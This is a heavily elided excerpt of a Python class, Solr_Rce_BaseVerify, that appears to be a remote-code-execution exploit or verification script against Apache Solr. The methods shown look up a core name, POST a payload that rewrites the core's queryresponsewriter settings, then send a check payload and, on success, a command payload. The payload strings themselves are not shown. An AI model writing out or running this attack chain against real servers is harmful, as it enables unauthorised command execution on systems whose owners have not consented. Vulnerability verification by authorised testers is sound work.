...
class Solr_Rce_BaseVerify:
    ...
    def get_code_name(self):
        ...
        try:
            req = requests.get(core_url, headers = self.headers, allow_redirects = False, verify = False)
    ...
    def update_queryresponsewriter(self, core_name_url):
        ...
        try:
            req = requests.post(core_name_url, headers = headers, data = payload, allow_redirects = False, verify = False)
    ...
    def send_exp(self, exp_url):
        try:
            check_req = requests.get(exp_url + self.check_payload, headers = self.headers, allow_redirects = False, verify = False)
            if check_req.status_code == 200 and self.capta in check_req.text:
                cmd_req = requests.get(exp_url + self.cmd_payload, headers = self.headers, allow_redirects = False, verify = False)
